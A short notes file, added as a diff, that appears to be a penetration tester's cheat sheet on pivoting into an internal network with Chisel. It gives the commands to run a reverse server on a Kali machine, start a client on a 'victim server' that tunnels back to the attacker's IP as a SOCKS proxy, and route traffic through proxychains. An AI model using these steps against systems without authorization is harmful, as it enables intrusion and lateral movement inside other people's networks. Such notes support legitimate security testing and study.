@@ -1,0 +1,14 @@
+Chisel :- Best tool to be used for Pivorting the Internal Network. 
+
+Step 1) Run the below command in the Kali machine 
+       umarkhan# ./chisel server -p 8001 --reverse
+
+Step 2) Transfer the Chisel program to the victim server 
+
+Step 3) Now we can establish the reverse connection from server to the Kali machine
+        C:\ ./chisel client <Kali Machine IP>:8001 R:1080:socks
+
+Step 4) We need to change the proxychain config in the Kali machine 
+        socks5 127.0.0.1 1080 <1080 is the port we configured as reverse port>
+
+Step 5) Now we can intiate the connection for the Internal network from Kali itself 
